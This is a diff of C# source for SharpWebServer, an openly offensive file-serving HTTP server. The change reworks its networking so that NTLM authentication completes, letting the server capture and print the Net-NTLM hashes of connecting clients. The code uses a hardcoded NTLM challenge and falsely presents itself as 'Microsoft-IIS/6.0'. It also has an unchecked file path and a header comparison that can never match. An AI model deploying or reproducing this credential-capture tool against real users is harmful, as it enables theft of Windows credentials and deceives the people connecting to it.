@@ -18,27 +18,28 @@
 //      https://github.com/mdsecactivebreach/Farmer
 //
 // Disclaimer:
-//   I've merely combined all the building blocks together to come up with a hefty tool.
+//   My addition was the use of Connection keep-alive during NTLM Authentication process to avoid use of HTTP/1.0 and 
+//   to facilitate correct authentication flow resulting in file download.
 //
 // Patchworked by:
 //   Mariusz B. / mgeeky, '21, <mb [at] binary-offensive.com>
 //
 
 using System;
-using System.Linq;
-using System.Collections.Generic;
-using System.Net.Sockets;
 using System.Net;
-using System.IO;
+using System.Net.Sockets;
 using System.Threading;
-using System.Threading.Tasks;
+using System.Net.NetworkInformation;
+using System.IO;
+using System.Collections;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
 
 namespace SharpWebServer
 {
-    public class SimpleHTTPServer : IDisposable
+    public class SharpWebServer
     {
-        private object _LockObjectDispose = new object();
-        private CancellationTokenSource _CancellationTokenSourceDisposed = new CancellationTokenSource();
         private readonly string[] _IndexFiles = {
             "index.html",
             "index.htm",
@@ -869,34 +870,37 @@ namespace SharpWebServer
              {".zmm", "application/vnd.handheld-entertainment+xml" }
             #endregion
         };
-        private Thread _ServerThread;
+        private TcpListener _listener;
         private string _RootDirectory;
         private bool _AllowCors;
-        private int _Port;
         private bool _Verbose;
         private bool _NTLM;
-        private Action<Exception> _HandleException;
+        private int _Port;
 
-        public int Port { get { return _Port; } }
-        public string RootDirectory { get { return _RootDirectory; } }
-        public SimpleHTTPServer(string directoryPath, int port, bool ntlm = false, bool verbose = false, bool allowCors = true, Action<Exception> handleException = null)
+        public SharpWebServer(string directoryPath, int port, bool ntlm = false, bool verbose = false)
         {
-            Initialize(directoryPath, port, ntlm, verbose, allowCors, handleException);
-        }
-        public SimpleHTTPServer(string directoryPath, bool ntlm = false, bool verbose = false, bool allowCors = true, Action<Exception> handleException = null)
-        {
-            Initialize(directoryPath, GetEmptyPort(), ntlm, verbose, allowCors, handleException);
-        }
-        private void Initialize(string path, int port, bool ntlm, bool verbose, bool allowCors, Action<Exception> handleException)
-        {
-            _RootDirectory = path;
-            _Port = port;
-            _AllowCors = allowCors;
+            _RootDirectory = directoryPath;
+            _AllowCors = false;
             _Verbose = verbose;
             _NTLM = ntlm;
-            _HandleException = handleException;
-            _ServerThread = new Thread(Listen);
-            _ServerThread.Start();
+            _Port = port;
+        }
+
+        private void Initialize()
+        {
+            _listener = new TcpListener(System.Net.IPAddress.Any, _Port);
+            _listener.Start();
+
+            ThreadPool.QueueUserWorkItem(Listen, null);
+        }
+
+        public void Stop()
+        {
+            if (_listener != null)
+            {
+                _listener.Stop();
+                _listener = null;
+            }
         }
 
         private void Log(string txt)
@@ -906,56 +910,197 @@ namespace SharpWebServer
                 Output("SharpWebServer [" + DateTime.Now.ToString("dd.MM.yy, HH:mm:ss") + $"] {txt}");
             }
         }
-        
-        public void Dispose()
+
+        private void Listen(object token)
         {
-            lock (_LockObjectDispose)
+            while(_listener != null)
             {
-                if (_CancellationTokenSourceDisposed.IsCancellationRequested) return;
-                _CancellationTokenSourceDisposed.Cancel();
+                try
+                {
+                    var client = _listener.AcceptTcpClient();
+                    ThreadPool.QueueUserWorkItem(HandleClient, client);
+                }
+                catch (Exception e)
+                {
+                    Output($"[*] Exception occurred : {e.Message}");
+                }
             }
         }
 
-        private void Listen()
+        public struct MyRequest
         {
-            using (HttpListener httpListener = new HttpListener())
+            public string PeerIP;
+            public string HttpMethod;
+            public string Uri;
+            public string HttpVersion;
+            public string Body;
+            public Dictionary<string, string> Headers;
+        }
+
+        private struct MyResponse
+        {
+            public Dictionary<string, string> Headers;
+            public string HttpVersion;
+            public int StatusCode;
+            public string StatusMessage;
+            public byte[] Output;
+            public string ContentType;
+            public long ContentLength;
+        }
+
+        private void SocketSetKeepAlive(TcpClient client)
+        {
+            // https://darchuk.net/2019/01/04/c-setting-socket-keep-alive/
+
+            // Get the size of the uint to use to back the byte array
+            int size = Marshal.SizeOf((uint)0);
+
+            // Create the byte array
+            byte[] keepAlive = new byte[size * 3];
+
+            // Pack the byte array:
+
+            // Turn keepalive on
+            Buffer.BlockCopy(BitConverter.GetBytes((uint)1), 0, keepAlive, 0, size);
+
+            // Set amount of time without activity before sending a keepalive to 5 seconds
+            Buffer.BlockCopy(BitConverter.GetBytes((uint)5000), 0, keepAlive, size, size);
+
+            // Set keepalive interval to 5 seconds
+            Buffer.BlockCopy(BitConverter.GetBytes((uint)5000), 0, keepAlive, size * 2, size);
+
+            // Set the keep-alive settings on the underlying Socket
+            client.Client.IOControl(IOControlCode.KeepAliveValues, keepAlive, null);
+        }
+
+        private void HandleClient(object token)
+        {
+            try
             {
-                httpListener.Prefixes.Add($"http://*:{ _Port.ToString() }/");
-                httpListener.Start();
-                using (CancellationTokenRegistration cancellationTokenRegistration = _CancellationTokenSourceDisposed.Token.Register(
-                    httpListener.Abort))
+                var client = token as TcpClient;
+                string peerIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
+                var stream = client.GetStream();
+
+                using (var reader = new StreamReader(stream))
                 {
-                    while (!_CancellationTokenSourceDisposed.IsCancellationRequested)
+                    var writer = new StreamWriter(stream);
+                    var requestFinished = 0;
+                    var state = 0;
+
+                    var response = new MyResponse
                     {
-                        try
+                        Headers = new Dictionary<string, string>(),
+                        Output = null,
+                        HttpVersion = "HTTP/1.1"
+                    };
+
+                    var request = new MyRequest
+                    {
+                        Headers = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase)
+                    };
+
+                    while (requestFinished == 0)
+                    {
+                        if (state == 0)
                         {
-                            //Using this method because the GetContext method will not exit cleanly even when Stop or Abort are called.
-                            Task<HttpListenerContext> task = httpListener.GetContextAsync();
-                            task.Wait(_CancellationTokenSourceDisposed.Token);
-                            Process(task.Result);
+                            var lineInput = reader.ReadLine();
+                            if(lineInput == null || lineInput.Length == 0 || lineInput.IndexOf(' ') == -1)
+                            {
+                                requestFinished = 1;
+                                client.Close();
+                                break;
+                            }
+
+                            var line = lineInput.Split(' ');
+
+                            request.HttpMethod = line[0];
+                            request.Uri = line[1];
+                            request.HttpVersion = line[2];
+                            state = 1;
                         }
-                        catch (Exception ex)
+                        else
                         {
-                            _HandleException?.Invoke(ex);
+                            var lineInput = reader.ReadLine();
+                            if (lineInput == "")
+                            {
+                                request.Body = "";
+
+                                Process(ref request, ref response);
+                                var output = PrepareResponse(ref request, ref response);
+
+                                writer.BaseStream.Write(output, 0, output.Length);
+                                writer.Flush();
+
+                                System.Threading.Thread.Sleep(500);
+
+                                if (response.Headers.ContainsKey("Connection") && response.Headers["Connection"].ToLower().Equals("Close"))
+                                {
+                                    requestFinished = 1;
+                                    client.Close();
+                                }
+                                else
+                                {
+                                    SocketSetKeepAlive(client);
+
+                                    state = 0;
+                                    response = new MyResponse
+                                    {
+                                        Headers = new Dictionary<string, string>(),
+                                        Output = null,
+                                        HttpVersion = "HTTP/1.1"
+                                    };
+                                    request = new MyRequest
+                                    {
+                                        Headers = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase)
+                                    };
+                                }
+                            }
+                            else
+                            {
+                                string[] line = lineInput.Split(':');
+                                request.Headers.Add(line[0].Trim(), line[1].TrimStart());
+                            }
                         }
                     }
                 }
             }
+            catch (Exception e)
+            {
+                Output($"[*] Exception occurred : {e.Message}");
+            }
         }
-        private int GetEmptyPort()
+
+        private byte[] PrepareResponse(ref MyRequest request, ref MyResponse response)
         {
-            TcpListener tcpListener = new TcpListener(IPAddress.Loopback, 0);
-            int port;
-            tcpListener.Start();
-            try
+            if (response.ContentLength > 0 && !response.Headers.ContainsKey("content-length"))
             {
-                port = ((IPEndPoint)tcpListener.LocalEndpoint).Port;
+                response.Headers.Add("Content-Length", response.ContentLength.ToString());
             }
-            finally
+
+            response.Headers.Add("Server", "Microsoft-IIS/6.0");
+            response.Headers.Add("Date", DateTime.Now.ToString("r"));
+
+            using (var outp = new MemoryStream())
             {
-                tcpListener.Stop();
+                using (var writer = new StreamWriter(outp))
+                {
+                    writer.Write($"{response.HttpVersion} {response.StatusCode} {response.StatusMessage}\r\n");
+                    foreach (var k in response.Headers.Keys)
+                    {
+                        writer.Write($"{k}: {response.Headers[k]}\r\n");
+                    }
+
+                    writer.Write("\r\n");
+                    writer.Flush();
+
+                    if (response.Output != null && response.Output.Length > 0)
+                    {
+                        writer.BaseStream.Write(response.Output, 0, response.Output.Length);
+                    }
+
+                    return outp.ToArray();
+                }
             }
-            return port;
         }
 
         private static string DecodeNTLM(byte[] NTLM)
@@ -1004,24 +1149,20 @@ namespace SharpWebServer
             return "";
         }
 
-        private void OverrideServerHeader(HttpListenerResponse response)
+        private void Process(ref MyRequest request, ref MyResponse response)
         {
-            response.Headers.Add("Server", "\r\n\r\n");
-        }
-
-        private void Process(HttpListenerContext httpListenerContext)
-        {
-            var request = httpListenerContext.Request;
-            var response = httpListenerContext.Response;
-            string peerAddr = request.RemoteEndPoint.Address.ToString();
-
             bool process = true;
             if(_NTLM)
             {
-                if(request.Headers["authorization"] == null)
+                if (!request.Headers.ContainsKey("authorization"))
                 {
                     response.StatusCode = (int)HttpStatusCode.Unauthorized;
-                    response.AddHeader("WWW-Authenticate", "NTLM");
+                    response.StatusMessage = "Unauthorized";
+                    response.HttpVersion = "HTTP/1.1";
+                    response.Headers.Add("WWW-Authenticate", "NTLM");
+                    response.Headers.Add("Connection", "keep-alive");
+                    response.Headers.Add("Content-Length", "0");
+
                     process = false;
                     Log("NTLM: Sending 401 Unauthorized due to lack of Authorization header.");
                 }
@@ -1035,12 +1176,12 @@ namespace SharpWebServer
                         auth[1] = auth[1].TrimStart();
                         byte[] NTLMHash = System.Convert.FromBase64String(auth[1]);
 
+                        // NTLM type 3 message - client's response
                         if (NTLMHash[8] == 3)
                         {
                             var NTLMHashString = DecodeNTLM(NTLMHash);
                             Output("\n[+] SharpWebServer: Net-NTLM hash captured:");
                             Output(NTLMHashString + "\n");
-
                             process = true;
                         }
                     }
@@ -1050,7 +1191,10 @@ namespace SharpWebServer
                         Log("NTLM: Sending 401 Unauthorized with NTLM Challenge Response.");
 
                         response.StatusCode = (int)HttpStatusCode.Unauthorized;
-                        response.AddHeader("WWW-Authenticate", "NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==");
+                        response.StatusMessage = "Unauthorized";
+                        response.Headers.Add("WWW-Authenticate", "NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==");
+                        response.Headers.Add("Connection", "keep-alive");
+                        response.Headers.Add("Content-Length", "0");
                     }
                 }
             }
@@ -1058,66 +1202,71 @@ namespace SharpWebServer
             if (process)
             {
                 if (request.HttpMethod.ToLower() == "get")
-                    OnProcessGET(request, response);
+                    OnProcessGET(ref request, ref response);
+
                 else if (request.HttpMethod.ToLower() == "head")
-                    OnProcessHEAD(request, response);
+                    OnProcessHEAD(ref request, ref response);
+
+                response.Headers.Add("Connection", "Close");
             }
 
-            OverrideServerHeader(response);
-            response.OutputStream.Close();
-
-            uint sizeInBytes = 0;
-            if(response.Headers["Content-Length"] != null)
+            long sizeInBytes = 0;
+            if(response.ContentLength > 0)
             {
-                sizeInBytes = UInt32.Parse(response.Headers["Content-Length"]);
+                sizeInBytes = response.ContentLength;
             }
 
-            Log($"{peerAddr} - \"{request.HttpMethod} {request.Url.AbsolutePath}\" - len: {sizeInBytes} ({response.StatusCode})");
+            Log($"{request.PeerIP} - \"{request.HttpMethod} {request.Uri}\" - len: {sizeInBytes} ({response.StatusCode})");
         }
 
-        private void OnProcessGET(HttpListenerRequest request, HttpListenerResponse response)
+        private void OnProcessGET(ref MyRequest request, ref MyResponse response)
         {
             string fileName = null;
             try
             {
-                fileName = GetRequestedFileName(request);
+                fileName = GetRequestedFileName(ref request);
                 string filePath = fileName == null ? null : Path.Combine(_RootDirectory, fileName);
 
                 if(filePath.Length == 0)
                 {
                     response.StatusCode = (int)HttpStatusCode.OK;
+                    response.StatusMessage = "OK";
                     return;
                 }
                 else if (filePath == null || !File.Exists(filePath))
                 {
                     response.StatusCode = (int)HttpStatusCode.NotFound;
+                    response.StatusMessage = "Not Found";
                     return;
                 }
 
-                ReturnFile(filePath, response);
+                ReturnFile(filePath, ref response);
             }
             catch (Exception ex)
             {
                 response.StatusCode = (int)HttpStatusCode.InternalServerError;
+                response.StatusMessage = "Internal Server Error";
                 Console.WriteLine($"[!] Exception occured while serving file: {fileName} . Exception: {ex}");
             }
         }
 
-        private void OnProcessHEAD(HttpListenerRequest request, HttpListenerResponse response)
+        private void OnProcessHEAD(ref MyRequest request, ref MyResponse response)
         {
             string fileName = null;
             try
             {
-                fileName = GetRequestedFileName(request);
+                fileName = GetRequestedFileName(ref request);
                 string filePath = fileName == null ? null : Path.Combine(_RootDirectory, fileName);
 
                 if (filePath.Length == 0)
                 {
                     response.StatusCode = (int)HttpStatusCode.OK;
+                    response.StatusMessage = "OK";
                 }
                 else if (filePath == null || !File.Exists(filePath))
                 {
-                    response.StatusCode = (int)HttpStatusCode.NotFound; 
+                    response.StatusCode = (int)HttpStatusCode.NotFound;
+                    response.StatusMessage = "Not Found";
                 }
 
                 return;
@@ -1125,50 +1274,52 @@ namespace SharpWebServer
             catch (Exception ex)
             {
                 response.StatusCode = (int)HttpStatusCode.InternalServerError;
+                response.StatusMessage = "Internal Server Error";
                 Console.WriteLine($"[!] Exception occured while serving file: {fileName} . Exception: {ex}");
             }
         }
 
-        private void ReturnFile(string filePath, HttpListenerResponse response)
+        private void ReturnFile(string filePath, ref MyResponse response)
         {
             using (Stream input = new FileStream(filePath, FileMode.Open))
             {
                 response.ContentType = GetContentType(filePath);
-                response.ContentLength64 = input.Length;
-
-                //response.AddHeader("Date", DateTime.Now.ToString("r"));
-                //response.AddHeader("Last-Modified", System.IO.File.GetLastWriteTime(filePath).ToString("r"));
+                response.ContentLength = input.Length;
+                
+                //response.Headers.Add("Last-Modified", System.IO.File.GetLastWriteTime(filePath).ToString("r"));
 
                 if (_AllowCors)
-                    response.AddHeader("Access-Control-Allow-Origin", "*");
+                    response.Headers.Add("Access-Control-Allow-Origin", "*");
 
-                OverrideServerHeader(response);
-                WriteInputStreamToResponse(input, response.OutputStream);
-
+                response.Output = ReadFully(input);
                 response.StatusCode = (int)HttpStatusCode.OK;
+                response.StatusMessage = "OK";
             }
         }
 
-        private string GetRequestedFileName(HttpListenerRequest httpListenerRequest)
+        private string GetRequestedFileName(ref MyRequest request)
         {
-            string fileName = httpListenerRequest.Url.AbsolutePath.Substring(1);
+            string fileName = request.Uri.Substring(1);
             if (string.IsNullOrEmpty(fileName))
                 fileName = GetExistingIndexFileName();
             return fileName;
         }
-        private void WriteInputStreamToResponse(Stream inputStream, Stream outputStream)
-        {
 
-            byte[] buffer = new byte[1024 * 16];
-            int nbytes;
-            while ((nbytes = inputStream.Read(buffer, 0, buffer.Length)) > 0)
-                outputStream.Write(buffer, 0, nbytes);
+        public static byte[] ReadFully(Stream input)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                input.CopyTo(ms);
+                return ms.ToArray();
+            }
         }
+
         private string GetContentType(string filePath)
         {
             string mime;
             if (_MimeTypeMappings.TryGetValue(Path.GetExtension(filePath), out mime))
                 return mime;
+
             return "application/octet-stream";
         }
         private string GetExistingIndexFileName()
@@ -1223,7 +1374,8 @@ Authors:
     - Can Güney Aksakalli (github.com/aksakalli)          - original implementation
     - harrypatrick442 (github.com/harrypatrick442)        - aksakalli's fork & changes
     - Dominic Chell (@domchell) from MDSec                - Net-NTLMv2 hashes capture code borrowed from Farmer
-    - Mariusz B. / mgeeky, <mb [at] binary-offensive.com> - combined all building blocks together
+    - Mariusz B. / mgeeky, <mb [at] binary-offensive.com> - combined all building blocks together, 
+                                                            added connection keep-alive to NTLM Authentication
 ");
                 Usage();
                 return;
@@ -1291,9 +1443,10 @@ Authors:
             }
 
             Output($"[.] Serving files from directory : {dir}\n");
-            Directory.SetCurrentDirectory(dir);
 
-            var server = new SimpleHTTPServer(dir, port, ntlm, verbose, false, null);
+            var server = new SharpWebServer(dir, port, ntlm, verbose);
+
+            server.Initialize();
 
             if (seconds == 0)
             {
@@ -1313,6 +1466,8 @@ Authors:
                 }
 
                 Output($"[.] SharpWebServer time to listen elapsed. Bye!");
+
+                server.Stop();
                 System.Environment.Exit(0);
             }
         }
